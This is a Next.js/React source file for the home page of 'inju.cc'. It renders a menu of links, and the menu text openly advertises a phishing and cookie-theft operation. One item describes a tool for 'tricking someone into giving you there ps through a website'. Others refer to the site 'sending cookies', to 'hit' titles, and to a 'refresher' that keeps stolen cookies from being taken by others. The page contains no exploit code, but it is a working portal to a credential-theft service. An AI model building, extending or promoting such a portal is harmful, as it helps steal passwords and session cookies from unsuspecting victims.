import Background from "@/components/Background";
import CircularMenu from "@/components/CircularMenu";
import PulsatingTitle from "@/components/PulsatingTitle";

const menuItems = [
  {
    id: 1,
    label: "INJU.CC",
    info: "This is the main website to the inju.cc domain, if you are new please follow troubleshooting steps",
    link: "https://inju.cc/u/MainControlPage"
  },
  {
    id: 2,
    label: "DISCORD",
    info: "Join the Offical server for downtimes, updates, and more!!!",
    link: "https://discord.gg/injuv3"
  },
  {
    id: 3,
    label: "AUTOHAR",
    info: "Autohar is a way of tricking someone into giving you there ps through a website (AUTOHAR IS NOT MINE)",
    link: "https://bloxtools.in/controlPage/create"
  },
  {
    id: 4,
    label: "REFRESHER",
    info: "Refresh your cookies that you get to prevent theft over others if wanted",
    link: "https://inju.cc/tools/refresher"
  },
  {
    id: 5,
    label: "TROUBLESHOOT",
    info: "If you are new or if site is not sending cookies, or hit title is something other than 'INJURIES' Use this",
    link: "https://discord.com/channels/1286805719911370783/1333224210398445588"
  },
  {
    id: 6,
    label: "YOUTUBE",
    info: "We currently dont have one at the moment",
    link: "https://discord.gg/injuv3"
  }
];

export default function Home() {
  return (
    <div className="min-h-screen w-full bg-black overflow-hidden relative">
      <Background />
      <div className="relative z-10 w-full h-screen flex items-center justify-center">
        <PulsatingTitle />
        <CircularMenu items={menuItems} />
      </div>
    </div>
  );
}
